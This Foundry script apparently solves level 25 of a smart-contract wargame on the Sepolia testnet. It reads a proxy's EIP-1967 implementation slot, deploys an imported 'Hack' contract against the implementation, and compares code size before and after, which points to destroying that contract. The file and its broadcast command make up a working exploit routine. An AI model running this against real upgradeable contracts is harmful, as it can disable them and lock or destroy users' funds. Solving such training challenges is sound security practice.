// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Hack} from "../src/level25.sol";

contract Level25Script is Script {
    bytes32 constant SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function run(address instanceAddress) external {
        address implementation = address(
            uint160(uint256(vm.load(instanceAddress, SLOT)))
        );

        uint256 codeSizeBefore;
        assembly {
            codeSizeBefore := extcodesize(implementation)
        }
        console.log("Engine address:", implementation);
        console.log("Code size before:", codeSizeBefore);

        vm.startBroadcast();
        Hack hackContract = new Hack(instanceAddress);
        hackContract.hack(implementation);
        vm.stopBroadcast();

        uint256 codeSizeAfter;
        assembly {
            codeSizeAfter := extcodesize(implementation)
        }
        console.log("Code size after:", codeSizeAfter);
    }
}
//forge script script/level25.s.sol:Level25Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sig "run(address)" your instance address
